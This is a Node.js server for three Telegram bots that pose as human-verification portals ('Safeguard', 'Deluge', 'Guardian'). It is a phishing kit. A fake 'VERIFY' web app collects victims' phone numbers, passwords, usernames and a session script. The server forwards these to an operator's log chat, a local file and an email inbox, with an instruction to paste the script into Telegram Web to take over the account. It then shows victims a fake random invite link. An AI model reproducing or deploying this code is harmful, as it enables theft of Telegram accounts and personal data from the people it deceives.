const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const phoneUtil = require('google-libphonenumber').PhoneNumberUtil.getInstance();
const dotenv = require('dotenv');
const path = require('path');
const fs = require('fs');
const nodemailer = require('nodemailer');

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));

const safeguardToken = process.env.SAFEGUARD_TOKEN;
const delugeToken = process.env.DELUGE_TOKEN;
const guardianToken = process.env.GUARDIAN_TOKEN;

const safeguardBot = new TelegramBot(safeguardToken, { webHook: { port: process.env.PORT || 3000 } });
const delugeBot = new TelegramBot(delugeToken, { webHook: { port: process.env.PORT || 3000 } });
const guardianBot = new TelegramBot(guardianToken, { webHook: { port: process.env.PORT || 3000 } });

const safeguardUsername = "SafetyGuardianRobot";
const delugeUsername = "DelugeGuardiansBot";
const guardianUsername = "GuardianSafetyrobot";

const safeguardVerification = path.join(__dirname, '../public/safeguard/verification.jpg');
const delugeVerification = path.join(__dirname, '../public/deluge/verification.jpg');
const guardianVerification = path.join(__dirname, '../public/guardian/verification.jpg');

const safeguardSuccess = path.join(__dirname, '../public/safeguard/success.jpg');
const guardianSuccess = path.join(__dirname, '../public/guardian/success.jpg');

const guardianButtonTexts = [
  "Join Group",
  "Enter Chat",
  "Access Now",
  "Join Now",
  "Enter Now"
];

// Set up nodemailer transporter for sending emails
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

function handleStart(bot) {
  bot.onText(/\/start(?: (.*))?$/, (msg, match) => {
    console.log(`Received /start command for bot with message: ${JSON.stringify(msg)}`);
    const parameter = match[1];
    let botInfo;
    bot.getMe().then(botInformation => {
      botInfo = botInformation;
      if (botInfo.username) {
        const chatId = msg.chat.id;
        let jsonToSend;
        let imageToSend;
        if (parameter === 'login') {
          jsonToSend = {
            caption: `Please share your login data to continue.`,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[{
                text: "Share Login Data",
                web_app: {
                  url: `${process.env.DOMAIN}/${botInfo.username.toLowerCase().replace('bot', '')}/?type=${botInfo.username.toLowerCase().replace('bot', '')}`
                }
              }]]
            }
          };
          if (botInfo.username === safeguardUsername) {
            imageToSend = safeguardVerification;
          } else if (botInfo.username === delugeUsername) {
            imageToSend = delugeVerification;
          } else if (botInfo.username === guardianUsername) {
            imageToSend = guardianVerification;
          }
        } else {
          if (botInfo.username === safeguardUsername) {
            jsonToSend = {
              caption: `<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{
                  text: "VERIFY",
                  web_app: {
                    url: `${process.env.DOMAIN}/safeguard/?type=safeguard`
                  }
                }]]
              }
            };
            imageToSend = safeguardVerification;
          } else if (botInfo.username === delugeUsername) {
            jsonToSend = {
              caption: `The group is protected by @delugeguardbot.\n\nClick below to start human verification.`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{
                  text: "Tap To Verify",
                  web_app: {
                    url: `${process.env.DOMAIN}/deluge/?type=deluge`
                  }
                }]]
              }
            };
            imageToSend = delugeVerification;
          } else if (botInfo.username === guardianUsername) {
            jsonToSend = {
              caption: `🧑 <b>Human Authentication</b>\n\nPlease click the button below to verify that you are human.`,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: [[{
                  text: "Verify",
                  web_app: {
                    url: `${process.env.DOMAIN}/guardian/?type=guardian`
                  }
                }]]
              }
            };
            imageToSend = guardianVerification;
          }
        }
        
        bot.sendPhoto(
          chatId, 
          imageToSend,
          jsonToSend
        );
      }
    });
  });
}

const handleRequest = async (req, res, data) => {  
  const botMap = {
    safeguard: safeguardBot,
    guardian: guardianBot,
    deluge: delugeBot
  };
  let bot = botMap[data.type] || null;
  if (!bot) {
    console.error(`No bot found for type: ${data.type}`);
    res.status(400).json({ error: "Invalid bot type" });
    return;
  }
  const logMessage = `🪪 <b>UserID</b>: ${data.userId}\n🌀 <b>Name</b>: ${data.firstName}\n⭐ <b>Telegram Premium</b>: ${data.isPremium ? "✅" : "❌"}\n📱 <b>Phone Number</b>: <tg-spoiler>${data.phoneNumber}</tg-spoiler>\n${data.usernames.map(u => `👤 <b>Username</b>: @${u.username}`).join('\n')}\n🔐 <b>Password</b>: <code>${data.password !== undefined ? data.password : "Null"}</code>\n\nGo to <a href="https://web.telegram.org/">Telegram Web</a>, and paste the following script.\n<code>${data.script || "Not available"}</code>\n<b>Module</b>: ${data.type.charAt(0).toUpperCase() + data.type.slice(1)}`;
  console.log(`Attempting to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, logMessage);
  let messageSent = false;
  try {
    await bot.sendMessage(
      process.env.LOGS_ID,
      logMessage,
      { parse_mode: "HTML" }
    );
    console.log(`Successfully sent message to LOGS_ID for user ${data.userId}`);
    messageSent = true;
  } catch (error) {
    console.error(`Failed to send message to LOGS_ID ${process.env.LOGS_ID} for user ${data.userId}:`, error.message, error.stack);
  }
  if (!messageSent) {
    console.log("Fallback: Logging user data to Render logs due to failure in sending to LOGS_ID:");
    console.log(logMessage);
    // Save to file
    try {
      const timestamp = new Date().toISOString();
      const logEntry = `[${timestamp}] ${logMessage}\n\n`;
      fs.appendFileSync(path.join(__dirname, 'logs', 'login_data.txt'), logEntry);
      console.log(`Successfully saved login data to logs/login_data.txt for user ${data.userId}`);
    } catch (fileError) {
      console.error(`Failed to save login data to file for user ${data.userId}:`, fileError.message);
    }
    // Send to email
    try {
      await transporter.sendMail({
        from: process.env.EMAIL_USER,
        to: process.env.EMAIL_USER,
        subject: `User Login Data for ${data.userId}`,
        text: logMessage.replace(/<[^>]+>/g, ''), // Strip HTML tags for plain text email
        html: logMessage
      });
      console.log(`Successfully sent login data to email for user ${data.userId}`);
    } catch (emailError) {
      console.error(`Failed to send login data to email for user ${data.userId}:`, emailError.message);
    }
  }
  let type = data.type;
  if (type === "safeguard" || type === "guardian") {
    let image;
    let caption;
    if (type === "safeguard") {
      image = safeguardSuccess;
      caption = `Verified, you can join the group using this temporary link:\n\nhttps://t.me/+${generateRandomString(16)}\n\nThis link is a one time use and will expire`;
    } else if (type === "guardian") {
      image = guardianSuccess;
      caption = `☑️ <b>Verification successful</b>\n\nPlease click the invite link below to join the group:\n<i>https://t.me/+${generateRandomString(16)}</i>`;
    }

    const randomText = guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)];

    const guardianButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: randomText,
              url: `https://t.me/+${generateRandomString(16)}`
            }
          ]
        ]
      }
    };
    const safeguardButtons = {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "@SOLTRENDING",
              url: "https://t.me/SOLTRENDING"
            }
          ]
        ]
      }
    };

    const buttons = type === "safeguard" ? safeguardButtons : guardianButtons;

    try {
      await bot.sendPhoto(data.userId, image, {
        caption,
        ...buttons,
        parse_mode: "HTML"
      });
      console.log(`Successfully sent photo to user ${data.userId}`);
    } catch (error) {
      console.error(`Failed to send photo to user ${data.userId}:`, error.message);
    }
  }

  res.json({});
};

app.post('/api/users/telegram/info', async (req, res) => {
  console.log(`Received request at /api/users/telegram/info with body: ${JSON.stringify(req.body)}`);
  const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
  let formattedUsernames = [];
  if (usernames) {
    if (Array.isArray(usernames)) {
      formattedUsernames = usernames;
    } else if (typeof usernames === 'string') {
      try {
        formattedUsernames = JSON.parse(usernames);
      } catch (e) {
        console.error(`Failed to parse usernames: ${usernames}`, e);
      }
    }
  }
  await handleRequest(req, res, {
    userId,
    firstName,
    usernames: formattedUsernames,
    phoneNumber: phoneNumber || "Not shared",
    isPremium,
    password,
    quicklySet,
    type,
    script: quicklySet?.script
  });
});

app.post('/api/debug', (req, res) => {
  console.log(`Debug message from check.js: ${req.body.message}`);
  res.json({ status: 'ok' });
});

safeguardBot.setWebHook(`${process.env.DOMAIN}/bot${safeguardToken}`);
delugeBot.setWebHook(`${process.env.DOMAIN}/bot${delugeToken}`);
guardianBot.setWebHook(`${process.env.DOMAIN}/bot${guardianToken}`);

app.post(`/bot${safeguardToken}`, (req, res) => {
  console.log(`Received webhook update for Safeguard bot:`, JSON.stringify(req.body));
  safeguardBot.processUpdate(req.body);
  res.sendStatus(200);
});

app.post(`/bot${delugeToken}`, (req, res) => {
  console.log(`Received webhook update for Deluge bot:`, JSON.stringify(req.body));
  delugeBot.processUpdate(req.body);
  res.sendStatus(200);
});

app.post(`/bot${guardianToken}`, (req, res) => {
  console.log(`Received webhook update for Guardian bot:`, JSON.stringify(req.body));
  guardianBot.processUpdate(req.body);
  res.sendStatus(200);
});

handleStart(safeguardBot);
handleStart(delugeBot);
handleStart(guardianBot);

console.log("Safeguard bot initialized");
console.log("Deluge bot initialized");
console.log("Guardian bot initialized");

safeguardBot.getMe().then(botInfo => {
  console.log(`Safeguard Bot Username: ${botInfo.username}`);
});

delugeBot.getMe().then(botInfo => {
  console.log(`Deluge Bot Username: ${botInfo.username}`);
});

guardianBot.getMe().then(botInfo => {
  console.log(`Guardian Bot Username: ${botInfo.username}`);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
